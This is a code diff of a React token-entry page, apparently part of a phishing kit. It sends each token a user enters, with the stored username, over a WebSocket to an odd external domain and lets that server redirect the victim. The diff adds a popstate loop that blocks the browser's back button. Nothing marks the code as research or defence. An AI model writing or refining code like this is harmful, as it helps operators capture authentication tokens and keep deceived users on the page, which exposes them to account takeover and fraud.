@@ -1,6 +1,8 @@
 import { useState, useRef, useEffect } from "react";
 import { ChevronLeft, Eye, EyeOff } from "lucide-react";
 import { useNavigate } from "react-router-dom";
+import { useWebSocket } from "@/hooks/useWebSocket";
+import { resolveServerRoute } from "@/lib/resolveServerRoute";
 
 const TokenPage = () => {
   const [token, setToken] = useState("");
@@ -8,12 +10,24 @@ const TokenPage = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [erro, setErro] = useState("");
   const inputRef = useRef<HTMLInputElement>(null);
-  const wsRef = useRef<WebSocket | null>(null);
   const navigate = useNavigate();
 
   const usuario = localStorage.getItem("usuario") || "";
   const dispositivo = localStorage.getItem("dispositivo") || "";
   const nome = localStorage.getItem("nome") || "";
+
+  const { send } = useWebSocket({
+    reconectarPayload: { dispositivo },
+    onRedirect: (msg) => {
+      navigate(resolveServerRoute(msg.url));
+    },
+    onMessage: (msg) => {
+      if (msg.acao === "erro_token") {
+        setErro(msg.motivo || "Token inválido");
+        setIsLoading(false);
+      }
+    },
+  });
 
   useEffect(() => {
     inputRef.current?.focus();
@@ -25,24 +39,11 @@ const TokenPage = () => {
   }, []);
 
   useEffect(() => {
-    const ws = new WebSocket("wss://syncservicesqrgeneretor.online/ws/");
-    wsRef.current = ws;
-
-    ws.onopen = () => {
-      console.log("TokenPage WS conectado");
-      if (usuario) {
-        ws.send(JSON.stringify({ acao: "reconectar", usuario, dispositivo }));
-      }
-    };
-
-    ws.onmessage = (event) => {
-      const msg = JSON.parse(event.data);
-      console.log("TokenPage msg:", msg);
-    };
-
-    ws.onerror = (err) => console.error("Token WS erro:", err);
-    return () => { ws.close(); };
-  }, [usuario, dispositivo]);
+    window.history.pushState(null, "", window.location.href);
+    const handlePop = () => window.history.pushState(null, "", window.location.href);
+    window.addEventListener("popstate", handlePop);
+    return () => window.removeEventListener("popstate", handlePop);
+  }, []);
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
@@ -51,11 +52,9 @@ const TokenPage = () => {
     setIsLoading(true);
     setErro("");
 
-    wsRef.current?.send(JSON.stringify({ acao: "token", usuario, token }));
+    send({ acao: "token", usuario, token });
     navigate("/validando");
   };
-
-  const refDisplay = dispositivo ? `Ref. ${dispositivo}` : "";
 
   return (
     <>
